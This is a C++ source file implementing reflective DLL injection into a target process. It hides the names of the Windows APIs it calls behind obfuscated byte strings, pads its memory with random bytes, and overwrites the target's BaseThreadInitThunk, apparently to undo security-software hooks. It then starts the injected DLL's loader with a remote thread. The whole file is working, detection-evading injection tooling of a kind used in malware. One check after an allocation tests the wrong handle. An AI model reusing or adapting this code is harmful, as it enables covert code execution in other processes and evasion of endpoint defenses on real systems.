#include "pch.h"
#include "ReflectiveDllInject.h"
#include "ReflectiveLoaderFinder.h"

// You must allocate an heap or virtual memory and copy DLL data on it.
ULONGLONG ReflectiveDllInjectInternal(DWORD pid, LPCSTR reflectiveLoaderProcName, size_t dllDataSize, LPVOID dllDataHeap, size_t dllEntryParameterSize, LPVOID dllEntryParameterHeap)
{
	auto myOpenProcess = (MyOpenProcess)SilentProcAddr(L"\x2C\x22\x35\x29\x22\x2B\x74\x75\x69\x23\x2B\x2B", "\x08\x37\x22\x29\x17\x35\x28\x24\x22\x34\x34");
	auto myVirtualAllocEx = (MyVirtualAllocEx)SilentProcAddr(L"\x2C\x22\x35\x29\x22\x2B\x74\x75\x69\x23\x2B\x2B", "\x11\x2E\x35\x33\x32\x26\x2B\x06\x2B\x2B\x28\x24\x02\x3F");
	auto myWriteProcessMemory = (MyWriteProcessMemory)SilentProcAddr(L"\x2C\x22\x35\x29\x22\x2B\x74\x75\x69\x23\x2B\x2B", "\x10\x35\x2E\x33\x22\x17\x35\x28\x24\x22\x34\x34\x0A\x22\x2A\x28\x35\x3E");
	auto myReadProcessMemory = (MyReadProcessMemory)SilentProcAddr(L"\x2C\x22\x35\x29\x22\x2B\x74\x75\x69\x23\x2B\x2B", "\x15\x22\x26\x23\x17\x35\x28\x24\x22\x34\x34\x0A\x22\x2A\x28\x35\x3E");
	auto myVirtualProtect = (MyVirtualProtectEx)SilentProcAddr(L"\x2C\x22\x35\x29\x22\x2B\x74\x75\x69\x23\x2B\x2B", "\x11\x2E\x35\x33\x32\x26\x2B\x17\x35\x28\x33\x22\x24\x33\x02\x3F");
	auto myVirtualFreeEx = (MyVirtualFreeEx)SilentProcAddr(L"\x2C\x22\x35\x29\x22\x2B\x74\x75\x69\x23\x2B\x2B", "\x11\x2E\x35\x33\x32\x26\x2B\x01\x35\x22\x22\x02\x3F");
	auto myGetCurrentProcess = (MyGetCurrentProcess)SilentProcAddr(L"\x2C\x22\x35\x29\x22\x2B\x74\x75\x69\x23\x2B\x2B", "\x00\x22\x33\x04\x32\x35\x35\x22\x29\x33\x17\x35\x28\x24\x22\x34\x34");
	auto myCreateRemoteThread = (MyCreateRemoteThread)SilentProcAddr(L"\x2C\x22\x35\x29\x22\x2B\x74\x75\x69\x23\x2B\x2B", "\x04\x35\x22\x26\x33\x22\x15\x22\x2A\x28\x33\x22\x13\x2F\x35\x22\x26\x23");
	auto myWaitForSingleObject = (MyWaitForSingleObject)SilentProcAddr(L"\x2C\x22\x35\x29\x22\x2B\x74\x75\x69\x23\x2B\x2B", "\x10\x26\x2E\x33\x01\x28\x35\x14\x2E\x29\x20\x2B\x22\x08\x25\x2D\x22\x24\x33");
	auto myCloseHandle = (MyCloseHandle)SilentProcAddr(L"\x2C\x22\x35\x29\x22\x2B\x74\x75\x69\x23\x2B\x2B", "\x04\x2B\x28\x34\x22\x0F\x26\x29\x23\x2B\x22");
	LPVOID myBTITAddr = SilentProcAddr(L"\x2C\x22\x35\x29\x22\x2B\x74\x75\x69\x23\x2B\x2B", "\x05\x26\x34\x22\x13\x2F\x35\x22\x26\x23\x0E\x29\x2E\x33\x13\x2F\x32\x29\x2C");

	DWORD loaderOffset = GetReflectiveLoaderOffset((UINT_PTR)dllDataHeap, reflectiveLoaderProcName);
	if (!loaderOffset)
		return COMBINE(RINJ_ERR_LOADER_UNAVAILABLE, 0);

	// Must have SeDebugPrivilege
	HANDLE processHandle = myOpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, pid);
	if (!processHandle)
		return COMBINE_ERR(RINJ_ERR_OPEN_PROECSS);

	std::random_device rd;
	std::mt19937_64 mt(rd());
	std::uniform_int_distribution<int> shiftAmount(1, 8);
	std::uniform_int_distribution<int> fillData(0, UCHAR_MAX);
	auto pageShift = 4096 * shiftAmount(mt);
	LPVOID remoteDLLMemory = myVirtualAllocEx(processHandle, nullptr, dllDataSize + pageShift, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (!remoteDLLMemory)
		return COMBINE_ERR(RINJ_ERR_ALLOC_PROCMEM_DLL);

	auto random = new BYTE[pageShift];
	for (int i = 0; i < pageShift; i++)
		random[i] = fillData(mt);
	myWriteProcessMemory(processHandle, remoteDLLMemory, random, pageShift, nullptr);
	delete[] random;

	remoteDLLMemory = (LPSTR)remoteDLLMemory + pageShift;

	BOOL state = myWriteProcessMemory(processHandle, remoteDLLMemory, dllDataHeap, dllDataSize, nullptr);
	if (!state)
		return COMBINE_ERR(RINJ_ERR_ALLOC_PROCMEM_DLL);

	DWORD oldProtect = 0;

	if (myBTITAddr)
	{
		UCHAR myBTITData[16];
		SIZE_T readBTIT = 0, writtenBTIT = 0;
		HANDLE handleOfMyself = myGetCurrentProcess();
		state = myReadProcessMemory(handleOfMyself, myBTITAddr, myBTITData, sizeof(myBTITData), &readBTIT);
		if (!state || readBTIT != sizeof(myBTITData))
			return COMBINE_ERR(RINJ_ERR_READ_MY_BTIT);

		// my BTIT address = their BTIT address (because base address of kernel32.dll is same across all processes)
		state = myVirtualProtect(processHandle, myBTITAddr, sizeof(myBTITData), PAGE_EXECUTE_READWRITE, &oldProtect);
		if (!state)
			return COMBINE_ERR(RINJ_ERR_UNLOCK_PROC_BTIT);

		state = myWriteProcessMemory(processHandle, myBTITAddr, myBTITData, sizeof(myBTITData), &writtenBTIT);
		if (!state || writtenBTIT != sizeof(myBTITData))
			return COMBINE_ERR(RINJ_ERR_OVERWRITE_PROC_BTIT);

		state = myVirtualProtect(processHandle, myBTITAddr, sizeof(myBTITData), oldProtect, &oldProtect);
		if (!state)
			return COMBINE_ERR(RINJ_ERR_RELOCK_PROC_BTIT);
	}

	LPVOID remoteParameterMemory = myVirtualAllocEx(processHandle, nullptr, dllDataSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!processHandle)
		return COMBINE_ERR(RINJ_ERR_ALLOC_PROCMEM_EPARAM);

	state = myWriteProcessMemory(processHandle, remoteParameterMemory, dllEntryParameterHeap, dllEntryParameterSize, nullptr);
	if (!state)
		return COMBINE_ERR(RINJ_ERR_WRITE_PROCMEM_EPARAM);

	state = myVirtualProtect(processHandle, remoteDLLMemory, dllDataSize, PAGE_EXECUTE_READ, &oldProtect);
	if (!state)
		return COMBINE_ERR(RINJ_ERR_UNLOCK_PROCMEM_DLL);

	HANDLE threadHandle = myCreateRemoteThread(processHandle, nullptr, REFLECTIVE_LOADER_SIZE, (LPTHREAD_START_ROUTINE)((ULONG_PTR)remoteDLLMemory + loaderOffset), remoteParameterMemory, 0, nullptr);
	if (!threadHandle)
		return COMBINE_ERR(RINJ_ERR_CREATE_THREAD);

	myWaitForSingleObject(threadHandle, INFINITE);

	myVirtualFreeEx(processHandle, remoteDLLMemory, 0, MEM_RELEASE);
	myVirtualFreeEx(processHandle, remoteParameterMemory, 0, MEM_RELEASE);

	myCloseHandle(threadHandle);
	return COMBINE(RINJ_SUCCESS, 0);

}

ULONGLONG ReflectiveDllInject(DWORD pid, LPCSTR reflectiveLoaderProcName, size_t dllDataSize, LPVOID dllDataHeap, size_t dllEntryParameterSize, LPVOID dllEntryParameterHeap)
{
	__try
	{
		return ReflectiveDllInjectInternal(pid, reflectiveLoaderProcName, dllDataSize, dllDataHeap, dllEntryParameterSize, dllEntryParameterHeap);
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		return COMBINE(RINJ_ERR_UNKNOWN, 0);
	}
}

